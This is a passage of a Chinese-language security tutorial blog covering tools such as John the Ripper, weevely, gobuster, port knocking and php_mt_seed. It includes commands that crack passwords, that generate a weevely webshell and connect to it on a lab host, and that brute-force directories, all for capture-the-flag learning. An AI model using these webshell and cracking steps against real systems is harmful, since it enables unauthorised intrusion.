id=\"5）John\"><a href=\"#5）John\" class=\"headerlink\" title=\"5）John\"></a>5）John</h2><p>John是一个破解系统密码的工具</p>\n<p>使用很简单</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">john passwd.txt &#x2F;&#x2F;这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件\n\njohn --wordlist&#x3D;字典路径 passwd.txt &#x2F;&#x2F;这里是指定密码本，后面接的是需要爆破的密码文本文件<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">john --show passwd.txt &#x2F;&#x2F;这是查看该密码文本中已经被爆破成功过的密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220903140126704.png\" alt=\"image-20220903140126704\"></p>\n<p>就可以看到明文为<code>snoopy</code></p>\n<h2 id=\"6）weevely\"><a href=\"#6）weevely\" class=\"headerlink\" title=\"6）weevely\"></a>6）weevely</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p></blockquote>\n<p>生成Shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">weevely generate  &lt;文件名&gt;\n\n\nweevely generate 123456 shell.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>\n<p>利用触发shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">weevely http:&#x2F;&#x2F;192.168.133.139&#x2F;templates&#x2F;protostar&#x2F;789.php 123456\n\npython -m http.server 9999   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20220904133118746.png\" alt=\"image-20220904133118746\"></p>\n<p>成功进入shell</p>\n<h2 id=\"7）whatweb\"><a href=\"#7）whatweb\" class=\"headerlink\" title=\"7）whatweb\"></a>7）whatweb</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">whatweb http:&#x2F;&#x2F;192.168.220.156&#x2F; &gt;&gt; whatweb.txt\n&#x2F;&#x2F;把网站的框架信息导入到文本whatweb.txt中<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这个工具主要是查看网站的框架，和<code>wapplzer</code>类似</p>\n<p><img src=\"/post/tooluse(Commontools)/image-20221103104233193.png\" alt=\"image-20221103104233193\"></p>\n<h2 id=\"8）knockd\"><a href=\"#8）knockd\" class=\"headerlink\" title=\"8）knockd\"></a>8）knockd</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>\n<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p></blockquote>\n<p>什么意思呢，也就是说，我先关闭了一个端口</p>\n<p>但是呢，我为了我想要的人访问它，我写了一个<code>敲门的顺序（也就是访问端口的顺序）</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">顺序在&#x2F;etc&#x2F;knockd.conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>比如，</p>\n<p>我关闭了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">22&#x2F;ssh端口<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>我写了一个顺序</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">7893,6452,2412<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这是三个端口</p>\n<p>我为什么为你<code>打开22端口</code>，原因是因为你<code>敲对了顺序</code></p>\n<p>这里就涉及<code>敲门的方法</code></p>\n<h3 id=\"1-knock命令\"><a href=\"#1-knock命令\" class=\"headerlink\" title=\"1&gt; knock命令\"></a>1&gt; knock命令</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">knock 192.168.1.8 7469 8475 9842 &#x2F;&#x2F;192.168.1.8为目标ip<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"2-nc命令\"><a href=\"#2-nc命令\" class=\"headerlink\" title=\"2&gt;nc命令\"></a>2&gt;nc命令</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">$ nc -v dc9 7469\n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 7469 (?) : Connection refused\n\n$ nc -v dc9 8475                                                                                       \n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 8475 (?) : Connection refused\n\n$ nc -v dc9 9842                                                                                       \n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 9842 (?) : Connection refused\n\n也就是利用nc命令三次访问这3个端口<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最后用<code>nmap</code>扫一下就看见<code>22</code>端口打开了</p>\n<h2 id=\"9-openssl\"><a href=\"#9-openssl\" class=\"headerlink\" title=\"9)openssl\"></a>9)openssl</h2><h3 id=\"SSL-简介\"><a href=\"#SSL-简介\" class=\"headerlink\" title=\"SSL 简介\"></a>SSL 简介</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>按照我的理解来解释下，</p>\n<p>为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。</p>\n<p>为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，</p>\n<p>现在几乎所有的银行网站访问都是基于HTTPS协议的。<br>认证是通过证书+非对称加密算法来解决的</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>openssl可以实现：秘钥证书管理、对称加密和非对称加密。</p></blockquote>\n<p>举一个例子</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">openssl passwd -1 -salt salt password\n&#x3D;&#x3D;&gt;\n$1$salt$qJH7.N4xYta3aEG&#x2F;dfqo&#x2F;0\n\n-1使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。\n\n-salt salt用作盐的字符串。我选择字符串盐\n\npassword我们想使用的明文密码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"10-gobuster\"><a href=\"#10-gobuster\" class=\"headerlink\" title=\"10)gobuster\"></a>10)gobuster</h2><h3 id=\"爆破目录\"><a href=\"#爆破目录\" class=\"headerlink\" title=\"爆破目录\"></a>爆破目录</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">gobuster dir -w common.txt -u url<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"爆破子域名\"><a href=\"#爆破子域名\" class=\"headerlink\" title=\"爆破子域名\"></a>爆破子域名</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">gobuster vhost -w subdomains-top1million-5000.txt -u url<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"11-seed工具php-mt-seed\"><a href=\"#11-seed工具php-mt-seed\" class=\"headerlink\" title=\"11)seed工具php_mt_seed\"></a>11)seed工具php_mt_seed</h2><p>这里以一道题为例子讲解这个工具的使用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"seed.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//mt_srand(*********);</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hint: \"</span><span class=\"token operator\">.</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/base|\\.\\./i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/NewStar/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">//flag in `flag.php`</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Baby Hacker?\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"No Hacker!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> Hint<span class=\"token punctuation\">:</span> <span class=\"token number\">1219893521</span>\nNo Hacker<span class=\"token operator\">!</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<hr>\n<p>搜索这两个函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">mt_scrand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><code>mt_scrand(seed)</code>这个函数的意思，是通过分发<code>seed</code>种子，然后种子有了后，靠<code>mt_rand()</code>生成随机数。</p>\n<p>我们来写段代码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>  <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们访问，输出<code>162946439</code>。</p>\n<p>现在代码改为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token function\">mt_srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br/>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们再次访问:</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>162946439</p>\n<p>247161732</p>\n<p>1463094264</p>\n<p>1878061366</p>\n<p>394962642</p></blockquote>\n<p>发现<code>162946439</code>又出现了</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>所以可以推断出随机数其实是可预测的，</p>\n<p>它以一种线性的方式生成</p>\n<p>知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>\n<p>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。 </p></blockquote>\n<p>在我们的例题中，我们并不知道我们的种子是多少</p>\n<p>但是它给出了我们种子的第一个随机数<code>1219893521</code></p>\n<p>这个时候想要拿到种子的值，就需要大量反向的演算推导了</p>\n<p>这个过程很庞大，所以这里就用到了工具【脚本】<code>php_mt_seed</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">time .&#x2F;php_mt_seed 第一个随机数  <span 